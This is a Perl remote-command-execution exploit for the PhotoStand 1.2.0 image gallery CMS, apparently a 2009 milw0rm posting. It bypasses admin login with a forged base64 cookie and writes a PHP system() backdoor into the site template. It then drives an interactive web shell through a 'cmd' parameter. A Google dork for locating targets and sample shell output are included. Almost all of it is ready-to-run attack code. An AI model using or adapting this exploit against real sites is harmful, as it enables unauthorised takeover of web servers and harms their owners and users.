#!/usr/bin/perl

# App  : PhotoStand 1.2.0
# Site : http://www.photostand.org
# Remote Command Execution Exploit
# Credits to : Giovanni Buzzin, "Osirys"
# osirys[at]autistici[dot]org
# Greets: drosophila, emgent, Fireshot

# PhotoStand is a used Image Gallery CMS.
# PhotoStand is vulnerable to SQL Injection, (AUTH BYPASS), creating a cookie with the nick of the admin encoded in BASE64,
# a remote user is able to become Admin. The exploit just bypass the login, and edits the template putting in it code prone
# to RCE. It doesn't change anything, in fact it gets the previous template, and just adds the hell code.
# ENJOY

# Google Dork: powered by PhotoStand  Design by Vlad

# -------------------------------------------------------------------------------------
# Exploit tested in Local :
# -------------------------------------------------------------------------------------
# osirys[~]>$ perl r0x.txt http://localhost/photostand_1.2.0/photostand_1.2.0/ admin
#
#   ----------------------------
#      Photobase RCE Exploit
#         Coded by Osirys
#   ----------------------------
#
# [*] Bypassing Admin Login with a evil cookie !
# [+] SESSION ID grabbed: sbt9f85ps9n29an2d31911n806
# [*] Admin Login Bypassed !
# [*] Template source Found, editing it ..
# [*] Template edited, backdoored !!
# [*] Shell succesfully spawned !!
# [:D Hi myLord, execute your commands !!
#
# shell[localhost]$> id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$> pwd
# /home/osirys/web/photostand_1.2.0/photostand_1.2.0/templates/Simplified
# shell[localhost]$> exit
# [-] Quitting ..
#
# osirys[~]>$
# -------------------------------------------------------------------------------------

use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;
use URI::Escape;
use MIME::Base64;

my $host  =  $ARGV[0];
my $user  =  $ARGV[1];
my $rand  =  int(rand 150);
my $rand1 =  "1337".$rand;
my $rce   =  "<?php if(isset(Â§Â§Â§_GET[cmd])) {echo \"<br>$rand1<br>\";system(Â§Â§Â§_GET[cmd]);echo \"$rand1<br>\";}?>";
my $rce_p =  "/templates/Simplified/index.php?cmd=";

chomp($user);
$cookie = encode_base64($user);
$cookie =~ s/\%([A-Fa-f0-9]{2})/pack('C', hex($1))/seg;
$cookie =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;

help("-1") unless (($host)&&($user));
cheek($host) == 1 || help("-2");
&banner;

$datas = get_data($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

print "[*] Bypassing Admin Login with a evil cookie !\n";
socket_req("GET",$path."/admin/index.php",$cookie,"",1);
$phpsessid || die "\n[-] Can't login with evil Cookie !\n\n";
$cookie .= "; PHPSESSID=".$phpsessid;
socket_req("GET",$path."/admin/newart.php",$cookie,"",2,"New article<\/title>");
$gotcha == 1 || die "\n[-] Can't login with evil Cookie !\n\n";
print "[*] Admin Login Bypassed !\n";
socket_req("GET",$path."/admin/options.php?page=editor&edit=Simplified",$cookie,"",3);

my $re = join '', @tmp_out;
my $content = tag($re);
if ($content =~ /class="textbox">(.+)<\/textarea>/) {
    $template = $1;
    print "[*] Template source Found, editing it ..\n";
}
else {
    print "[-] Template source not Found, exiting ..\n";
    exit(0);
}

$template =~ s/(.+)/$rce$1/;
$template =~ s/\*/\n/g;
$template =~ s/\$/ /g;
$template =~ s/Â§Â§Â§/\$/g;
$template =~ s/\( _GET/(\$_GET/g;
my $code = uri_escape($template);
$code =~ s/\(/%28/g;
$code =~ s/\)/%29/g;
$code =~ s/%20/+/g;
$code =~ s/'/%27/g;
$code =~ s/!/%21/g;

my $post = "action=save&tpid=4&tp=index.php&template=Simplified&type=1&page=editor&editpage=".$code;
socket_req("POST",$path."/admin/options.php",$cookie,$post,0,"",1);

my $exec_url = ($host.$rce_p."id");
my $re = get_req($exec_url);
if ($re =~ /uid=/) {
    print "[*] Template edited, backdoored !!\n[*] Shell succesfully spawned !!\n[:D Hi myLord, execute your commands !!\n\n";
    &exec_cmd;
}
else {
    print "[-] Something wrong, sploit failed !\n\n";
    exit(0);
}

sub socket_req() {
    my($request,$path,$cookie,$content,$opt,$regexp,$sock_opt) = @_;
    my $stop;
    my $length = length($content);
    my $socket   =  new IO::Socket::INET(
                                            PeerAddr => $h0st,
                                            PeerPort => '80',
                                            Proto    => 'tcp',
                                         ) or die $!;

    if ($sock_opt == 1) {
        $opt_1 = "Referer: ".$host."/admin/options.php?page=editor&edit=Simplified\r\n";
        $opt_2 = "Content-Type: application/x-www-form-urlencoded\r\n";
    }
    else {
        $opt_1 = "";
        $opt_2 = "";
    }
    my $data = $request." ".$path." HTTP/1.1\r\n".
               "Host: ".$h0st."\r\n".
               "Keep-Alive: 300\r\n".
               "Connection: keep-alive\r\n".
               $opt_1.
               "Cookie: PS-SAVE=".$cookie."\r\n".
               $opt_2.
               "Content-Length: ".$length."\r\n\r\n".
               $content."\r\n";

    $socket->send($data);
    while ((my $e = <$socket>)&&($stop != 1)) {
        if ($opt == 0) {
            $stop = 1;
        }
        elsif ($opt == 1) {
            if ($e =~ /Set-Cookie: PHPSESSID=([0-9a-z]{1,50});/) {
                $phpsessid = $1;
                print "[+] SESSION ID grabbed: $phpsessid\n";
                $stop = 1;
            }
        }
        elsif ($opt == 2) {
            if ($e =~ /$regexp/) {
                ($stop,$gotcha) = (1,1);
            }
        }
        elsif ($opt == 3) {
            push(@tmp_out,$e);
        }

    }
}

sub exec_cmd {
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print "shell[$h0st]\$> ";
    $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n\n";
    $exec_url = $host.$rce_p.$cmd;
    my $re = get_req($exec_url);
    my $content = tag($re);
    if ($content =~ m/<br>$rand1<br>(.+)$rand1<br>/g) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        chomp($out);
        print "$out\n";
        &exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print "bash: ".$cmd.": command not found\n";
        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
        &exec_cmd;
    }

}

sub get_req() {
    $link   = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.+)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_data() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $h0st !~ /www/ || $h0st =~ s/www\.//;
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
}

sub banner {
    print "\n".
          "  ---------------------------- \n".
          "     PhotoStand RCE Exploit    \n".
          "         Coded by Osirys       \n".
          "  ---------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Bad Input!\n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path admin_username\n";
    print "    admin_username is the nick of the admin.\n\n";
    exit(0);
}

# milw0rm.com [2009-03-26]